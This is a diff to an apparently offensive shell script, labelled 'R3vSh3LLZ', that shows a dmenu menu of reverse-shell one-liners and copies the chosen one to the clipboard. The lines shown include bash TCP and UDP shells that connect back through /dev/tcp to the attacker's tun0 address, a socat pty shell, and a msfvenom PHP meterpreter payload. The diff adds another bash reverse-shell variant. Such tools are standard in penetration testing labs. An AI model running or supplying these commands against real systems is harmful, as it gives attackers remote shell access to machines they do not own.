@@ -32,6 +32,7 @@ esac
 ## bash
 bashtcp1_shell="bash -i >& /dev/tcp/$tun0_ip/$port 0>&1"
 bashtcp2_shell="0<&196;exec 196<>/dev/tcp/$tun0_ip/$port; sh <&196 >&196 2>&196"
+bashtcp3_shell="bash -c 'bash -i >& /dev/tcp/$tun0_ip/$port 0>&1'"
 bashudp1_shell="sh -i >& /dev/udp/$tun0_ip/$port 0>&1"
 ## socat
 socat1_shell="/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$tun0_ip:$port"
@@ -137,6 +138,7 @@ msfphp1_shell="msfvenom -p php/meterpreter_reverse_tcp LHOST=$tun0_ip LPORT=$por
 ## bash
 bashtcp1_text="bt1 -> $bashtcp1_shell"
 bashtcp2_text="bt2 -> $bashtcp2_shell"
+bashtcp3_text="bt3 -> $bashtcp3_shell"
 bashudp1_text="bu1 -> $bashudp1_shell"
 ## socat
 socat1_text="sc1 (github.com/andrew-d/static-binaries) -> $socat1_shell"
@@ -173,9 +175,9 @@ ncatudp1_text="ncat (udp) -> $ncatudp1_shell"
 ## openssl
 openssl1_text="ossl -> $openssl1_shell"
 ## powershell
-powershell1_text="ps1 (rev "\""'s + percent symbol(buggy in dmenu))"
-powershell2_text="ps2 (rev ' + percent symbol(buggy in dmenu))"
-powershell3_text="ps3 (download file) -> $powershell3_shell"
+powershell1_text="ps1-1 (rev "\""'s + percent symbol(buggy in dmenu))"
+powershell2_text="ps1-2 (COMMON) (rev ' + percent symbol(buggy in dmenu))"
+powershell3_text="ps1-3 (download file) -> $powershell3_shell"
 ## awk
 awk1_text="awk1 -> $awk1_shell"
 ## java
@@ -212,11 +214,12 @@ msfphp1_text="msfph1 (php revshell with msfvenom)"
 # ---
 
 # The Juicy part
-case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\n$rubylin2_text\\n$rubywin1_text\\n$golanglin1_text\\n$nc1_text\\n$nc2_text\\n$nc3_text\\n$ncat1_text\\n$ncatudp1_text\\n$openssl1_text\\n$powershell1_text\\n$powershell2_text\\n$powershell3_text\\n$awk1_text\\n$javalin1_text\\n$javawin1_text\\n$javastealth1_text\\n$war1_text\\n$lua1lin_text\\n$lua2x_text\\n$nodejs1_text\\n$nodejs2_text\\n$groovywin1_text\\n$groovystealth1_text\\n$c_text\\n$msfwin1_text\\n$msfwin2_text\\n$msfwin3_text\\n$msflin1_text\\n$msflin2_text\\n$msfosx1_text\\n$msfjava1_text\\n$msfpython1_text\\n$msfbash1_text\\n$msfperl1_text\\n$msfphp1_text" | dmenu -l 15 -i -p "R3vSh3LLZ")" in
+case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashtcp3_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\n$rubylin2_text\\n$rubywin1_text\\n$golanglin1_text\\n$nc1_text\\n$nc2_text\\n$nc3_text\\n$ncat1_text\\n$ncatudp1_text\\n$openssl1_text\\n$powershell1_text\\n$powershell2_text\\n$powershell3_text\\n$awk1_text\\n$javalin1_text\\n$javawin1_text\\n$javastealth1_text\\n$war1_text\\n$lua1lin_text\\n$lua2x_text\\n$nodejs1_text\\n$nodejs2_text\\n$groovywin1_text\\n$groovystealth1_text\\n$c_text\\n$msfwin1_text\\n$msfwin2_text\\n$msfwin3_text\\n$msflin1_text\\n$msflin2_text\\n$msfosx1_text\\n$msfjava1_text\\n$msfpython1_text\\n$msfbash1_text\\n$msfperl1_text\\n$msfphp1_text" | dmenu -l 15 -i -p "R3vSh3LLZ")" in
 
     ## bash
     "$bashtcp1_text") echo -n "$bashtcp1_shell" | xclip -selection clipboard ;;
     "$bashtcp2_text") echo -n "$bashtcp2_shell" | xclip -selection clipboard ;;
+    "$bashtcp3_text") echo -n "$bashtcp3_shell" | xclip -selection clipboard ;;
     "$bashudp1_text") echo -n "$bashudp1_shell" | xclip -selection clipboard ;;
 
     ## socat
